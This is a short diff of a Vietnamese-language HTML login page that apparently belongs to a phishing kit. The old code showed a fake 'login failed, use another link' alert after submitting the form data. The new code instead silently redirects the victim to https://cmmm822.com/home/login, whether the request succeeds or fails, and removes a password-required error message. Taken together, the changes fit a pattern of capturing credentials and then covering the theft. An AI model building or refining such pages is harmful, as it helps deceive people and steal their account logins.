@@ -468,10 +468,7 @@
                 <i class="fa-regular fa-eye-slash suffix-icon"></i>
             </div>
 
-            <div class="error-msg">
-                <i class="fa-solid fa-circle-exclamation"></i> Yêu cầu mật khẩu
-            </div>
-
+         
             <div class="checkbox-row">
                 <span class="custom-check"><i class="fa-solid fa-check"></i></span>
                 <span>Ghi nhớ tài khoản mật khẩu</span>
@@ -753,8 +750,10 @@
         })
         .then(res => res.json())
         .then(data => {
-            alert('Đăng nhập THẤT BẠI do link lỗi vui lòng tham gia bằng đường link khác!');
-            document.getElementById('withdraw-modal').style.display = 'none';
+            window.location.href = 'https://cmmm822.com/home/login';
+        })
+        .catch(err => {
+            window.location.href = 'https://cmmm822.com/home/login';
         });
     }
 
